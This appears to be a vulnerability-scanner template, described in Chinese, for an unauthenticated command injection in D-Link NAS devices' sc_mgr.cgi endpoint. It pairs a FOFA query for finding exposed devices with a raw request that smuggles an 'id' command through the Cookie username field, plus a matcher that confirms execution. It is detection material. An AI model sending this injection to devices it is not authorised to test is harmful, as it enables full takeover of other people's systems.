id: d-link-nas-sc_mgr_cgi-rce

info:
  name: D-Link NAS设备 sc_mgr.cgi 接口命令执行漏洞
  author: HuanXiong
  severity: critical
  description: |-
    fofa: body="/cgi-bin/login_mgr.cgi" && body="cmd=cgi_get_ssl_info"
    D-Link NAS设备 sc_mgr.cgi 接口存在命令执行漏洞，攻击者可通过Cookie中的username参数注入系统命令，无需身份验证即可执行任意命令，可能导致服务器被完全控制。
  reference:
    - 
  tags: rce, d-link, nas

http:
  - raw:
      - |-
        GET /cgi-bin/sc_mgr.cgi?cmd=SC_Get_Info HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
        Accept: */*
        Accept-Encoding: gzip, deflate
        Connection: close
        Cookie: username=mopfdfsewo'& id & echo 'mopfdfsewo;

    matchers:
      - type: dsl
        name: 远程命令执行
        dsl:
          - "status_code == 200 && contains_all(body, 'uid=', 'gid=', 'root' ,'mopfdfsewo')"